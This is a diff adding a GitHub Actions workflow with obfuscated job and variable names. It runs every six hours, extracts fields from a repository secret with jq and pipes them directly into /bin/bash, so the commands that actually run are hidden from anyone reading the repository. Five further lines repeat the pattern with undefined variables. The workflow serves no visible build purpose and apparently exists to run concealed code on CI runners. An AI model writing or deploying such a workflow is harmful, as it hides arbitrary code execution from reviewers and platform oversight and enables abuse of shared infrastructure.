@@ -1,0 +1,22 @@
+name: huangzhangboliang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangzhangboliang
+        env:
+          nvwn391: ${{ secrets.nvwn391 }}
+        run: |
+          echo $nvwn391 | jq -r .iq95498 | /bin/bash
+          echo $zflnv7 | jq -r .ri82 | /bin/bash
+          echo $ts9244 | jq -r .fx9 | /bin/bash
+          echo $gznf351 | jq -r .wahg68 | /bin/bash
+          echo $fflno036 | jq -r .gdsm8 | /bin/bash
+          echo $wxvx8159 | jq -r .zsjsa65 | /bin/bash
+
